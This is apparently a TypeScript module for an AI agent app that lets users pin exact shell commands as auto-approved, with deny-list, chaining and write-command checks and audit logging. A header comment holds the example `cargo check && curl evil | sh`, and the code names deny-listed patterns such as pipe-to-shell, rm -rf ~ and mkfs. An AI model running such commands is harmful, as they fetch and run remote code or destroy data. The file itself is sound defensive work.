/**
 * Scoped command allowlist — the approval-fatigue fix.
 *
 * Threat model: approval cards train users to rubber-stamp (the 10th
 * `cargo check` prompt gets a reflexive Approve, and so does the 1st
 * dangerous command that follows). Instead of an "all" auto-approve that
 * rubber-stamps everything, the user can pin EXACT command strings as
 * "always allow". Each pinned command is then executed without a card;
 * everything else still stops for review. Fewer prompts → more attention
 * on the ones that remain.
 *
 * Safety properties:
 *  - EXACT-MATCH ONLY: the stored string must equal the incoming command
 *    byte-for-byte. `cargo check` allowed ≠ `cargo check && curl evil | sh`
 *    allowed — chaining a second command produces a different string.
 *  - RISK-GATED ENTRY (per segment): the full command passes the hard
 *    deny-list, then EVERY `;`/`&&`/`||`/`|`/newline-separated segment
 *    must be low-risk, warning-free, and not write-shaped (rm/cp/tee/…).
 *    Real-world commands are chains (`cd x && cargo check`) — the old
 *    one-simple-invocation rule made the button unreachable. Exact-match
 *    pinning makes the chain itself the unit of approval, so a pinned
 *    chain still only ever approves THAT string.
 *  - AGENT-UNWRITABLE STORE: entries live at
 *    `~/.kai/allowlist/<workspace-hash>/allowlist.json` — outside every
 *    project (compare kaiPaths.ts rationale), and the path is blocked for
 *    agent writes by security.ts (`PROTECTED_DIRS`), so a prompt injection
 *    cannot self-grant future approvals.
 *  - AUDITED: every pin and every allowlisted execution lands in the audit
 *    trail.
 */

import { LazyStore } from "@tauri-apps/plugin-store";
import { homeDir } from "@tauri-apps/api/path";
import { normalizeWorkspacePath } from "./workspacePath";
import { djb2 } from "./kaiPaths";
import { analyzeShellCommand } from "./policy";
import { auditAppend, AUDIT_KINDS } from "./audit";

const MAX_ENTRIES = 100;

export type AllowlistEntry = {
  /** The exact command string that will be auto-approved. */
  command: string;
  /** Pinned at (ms epoch). */
  pinnedAt: number;
};

type StoreShape = { commands: AllowlistEntry[] };

/** In-memory cache per workspace, mirroring the sandbox config pattern. */
const cache = new Map<string, Set<string>>();
const loadedRoots = new Set<string>();

function storePathFor(root: string): string {
  const hash = djb2(normalizeWorkspacePath(root) ?? root).toString(16);
  return `allowlist/${hash}.json`;
}

async function loadRoot(root: string): Promise<Set<string>> {
  const cached = cache.get(root);
  if (cached) return cached;
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  let commands: string[] = [];
  try {
    const raw = (await store.get<StoreShape>("allowlist")) ?? { commands: [] };
    commands = Array.isArray(raw.commands)
      ? raw.commands.map((e) => e?.command).filter((c): c is string => typeof c === "string" && c.length > 0)
      : [];
  } catch {
    commands = [];
  }
  const set = new Set(commands);
  cache.set(root, set);
  loadedRoots.add(root);
  return set;
}

/**
 * Can this command be pinned at all? Conservative gate:
 *  - the policy analyzer must rate the FULL command safe (hard deny-lists:
 *    pipe-to-shell, rm -rf ~, mkfs, … — these can cross segments, so they
 *    run on the whole string)
 *  - no substitution (`$(…)`, backticks), redirection (`<`, `>`, `2>&1`),
 *    backgrounding (`cmd &`), or line continuation — a pinned command must
 *    be a literal invocation whose visible text is the whole story
 *  - split into `;` / `&&` / `||` / `|` / newline segments (quote-aware):
 *    EVERY segment must be low-risk and warning-free, and NO segment may be
 *    write-shaped (rm/mv/cp/tee/mkdir/… — a pin must never auto-approve a
 *    file write/delete). Real-world commands are chains (`cd x && cargo
 *    check`) — the old one-simple-invocation rule made the button
 *    unreachable in practice.
 *  - bounded length
 */

/** Write-shaped segment commands — a pin must never auto-approve a
 *  write/delete, even a "low-risk" one. */
const WRITE_SHAPED = new Set([
  "rm", "rmdir", "mv", "cp", "rsync", "dd", "tee", "shred", "truncate",
  "install", "mkdir", "touch", "ln", "chown", "chmod", "setfacl",
]);

/** Split a command into chain segments, quote-aware. Single `&` (background)
 *  is NOT a separator — it is rejected by the pre-check below. */
function splitSegments(cmd: string): string[] {
  const out: string[] = [];
  let cur = "";
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]!;
    if (quote) {
      if (ch === quote) quote = null;
      cur += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      cur += ch;
      continue;
    }
    if (ch === "\\" && i + 1 < cmd.length) {
      cur += ch + cmd[i + 1]!;
      i++;
      continue;
    }
    if (ch === ";" || ch === "\n") {
      out.push(cur);
      cur = "";
      continue;
    }
    if (ch === "|" || ch === "&") {
      // `|`, `||`, `&&` are separators; single `&` stays (pre-check rejects it).
      if (cmd[i + 1] === ch) i++;
      out.push(cur);
      cur = "";
      continue;
    }
    cur += ch;
  }
  out.push(cur);
  return out.map((s) => s.trim()).filter((s) => s.length > 0);
}

/** Leading command word of a segment, skipping `VAR=value` prefixes. */
function commandWord(segment: string): string {
  for (const t of segment.split(/\s+/)) {
    if (!/^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) return t.toLowerCase();
  }
  return "";
}

export function isAllowlistable(command: string): boolean {
  const cmd = command.trim();
  if (!cmd || cmd.length > 200) return false;
  // Whole-string policy gate — hard deny-list patterns (pipe-to-shell,
  // rm -rf ~, …) can CROSS segments, so they must run on the full text.
  const whole = analyzeShellCommand(cmd);
  if (!whole.safe) return false;
  if (whole.riskLevel !== "low" || whole.warnings.length > 0) return false;
  // Literal-invocation gate: substitution, redirection, backgrounding, and
  // continuations are invisible-effect syntax — a pin must be exactly what
  // it looks like. Quote-blind by design: `grep "a>b"` is a false negative
  // we accept, never a false positive.
  if (/\r|\$\(|`|<|>/.test(cmd)) return false;
  if (/(^|\s)&(\s|$)/.test(cmd)) return false; // backgrounding (`2>&1` has `>` above)
  const segments = splitSegments(cmd);
  if (segments.length === 0) return false;
  for (const seg of segments) {
    if (/\\$/.test(seg)) return false; // line continuation
    if (WRITE_SHAPED.has(commandWord(seg))) return false;
    const a = analyzeShellCommand(seg);
    if (!a.safe || a.riskLevel !== "low" || a.warnings.length > 0) return false;
  }
  return true;
}

/** Would an incoming command auto-approve under the allowlist for `root`? */
export async function isCommandAllowed(
  command: string,
  root: string | null,
): Promise<boolean> {
  if (!root) return false;
  const cmd = command.trim();
  if (!cmd) return false;
  const set = await loadRoot(root);
  if (!set.has(cmd)) return false;
  // Defense in depth: the pinned entry must STILL be allowlistable under
  // today's rules — a future rule-tightening (or a tampered store) can't
  // keep an old dangerous pin active.
  if (!isAllowlistable(cmd)) return false;
  auditAppend(AUDIT_KINDS.toolExec, "bash_run", `allowlisted: ${cmd.slice(0, 160)}`, root);
  return true;
}

/** Pin a command as always-allowed for this workspace. Audited. */
export async function pinCommand(root: string, command: string): Promise<boolean> {
  if (!isAllowlistable(command)) return false;
  const set = await loadRoot(root);
  if (set.size >= MAX_ENTRIES && !set.has(command)) return false;
  set.add(command.trim());
  await persist(root, set);
  auditAppend(
    AUDIT_KINDS.sandboxChange,
    "allowlist",
    `pinned: ${command.trim().slice(0, 160)}`,
    root,
  );
  return true;
}

/** Remove a pinned command. Audited. */
export async function unpinCommand(root: string, command: string): Promise<void> {
  const set = await loadRoot(root);
  if (set.delete(command.trim())) {
    await persist(root, set);
    auditAppend(
      AUDIT_KINDS.sandboxChange,
      "allowlist",
      `unpinned: ${command.trim().slice(0, 160)}`,
      root,
    );
  }
}

/** All pinned commands for a workspace, in pin order (store keeps order). */
export async function listCommands(root: string): Promise<AllowlistEntry[]> {
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  try {
    const raw = (await store.get<StoreShape>("allowlist")) ?? { commands: [] };
    return Array.isArray(raw.commands)
      ? raw.commands.filter(
          (e): e is AllowlistEntry =>
            !!e && typeof e.command === "string" && e.command.length > 0,
        )
      : [];
  } catch {
    return [];
  }
}

async function persist(root: string, set: Set<string>): Promise<void> {
  const store = new LazyStore(storePathFor(root), { defaults: {}, autoSave: 200 });
  const entries: AllowlistEntry[] = [];
  for (const command of set) {
    entries.push({ command, pinnedAt: Date.now() });
  }
  await store.set("allowlist", { commands: entries });
  await store.save();
}

/**
 * The audit trail needs no separate allowlist dir path — but the Security
 * panel shows where the store lives. Same keying as storePathFor.
 */
export async function allowlistDirFor(root: string): Promise<string> {
  const home = await homeDir();
  const homeNorm = home.replace(/\\/g, "/").replace(/\/+$/, "");
  const hash = djb2(normalizeWorkspacePath(root) ?? root).toString(16);
  return `${homeNorm}/.kai/allowlist/${hash}`;
}
